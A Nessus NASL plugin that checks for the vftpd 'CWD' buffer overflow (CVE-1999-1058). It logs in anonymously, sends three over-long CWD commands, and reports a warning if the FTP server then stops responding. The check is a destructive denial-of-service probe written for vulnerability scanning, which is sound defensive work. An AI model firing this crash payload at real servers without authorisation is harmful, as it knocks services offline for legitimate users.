#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10293);
 script_bugtraq_id(818);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-1999-1058");
 
 name["english"] = "vftpd buffer overflow";
 name["francais"] = "Dépassement de buffer dans vftpd";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
	     
 desc["english"] = "
It was possible to make the remote FTP server crash
by issuing the commands :

	CWD <buffer>
	CWD <buffer>
	CWD <buffer>

Where <buffer> is longer than 504 chars.	

An attacker can use this problem to prevent your FTP server
from working properly, thus preventing legitimate
users from using it.
Solution : upgrade your FTP to the latest version, 
or change it. 

Risk factor : Medium";
		 
		 
desc["francais"] = "
Il s'est avéré possible de faire planter le serveur
FTP distant en lui envoyant les commandes :

	CWD <buffer>
	CWD <buffer>
	CWD <buffer>

Où <buffer> fait plus de 504 caractères.

Un pirate peut utiliser ce problème pour empecher
votre service FTP de fonctionner et ainsi de servir
des clients légitimes.
Solution : mettez à jour votre serveur FTP, ou
changez-le.

	   
Facteur de risque : Moyen";
	 	     
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
		    
 
 script_summary(english:"Checks if the remote ftp can be buffer overflown",
 		francais:"Détermine si le serveur ftp distant peut etre soumis a un dépassement de buffer");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP", francais:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
		  
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include('ftp_func.inc');

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

if(!login)exit(0);



port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(!get_port_state(port))exit(0);
# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 domain = ereg_replace(pattern:"[^\.]*\.(.*)",
 		       string:get_host_name(),
		       replace:"\1");	
		       
 if(ftp_authenticate(socket:soc, user:"anonymous", pass:string("nessus@", domain)))
 {
  crp = crap(504);
  c = string("CWD ", crp, "\r\n");
  send(socket:soc, data:c) x 3;
  close(soc);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
  else close(soc2);
 }
}
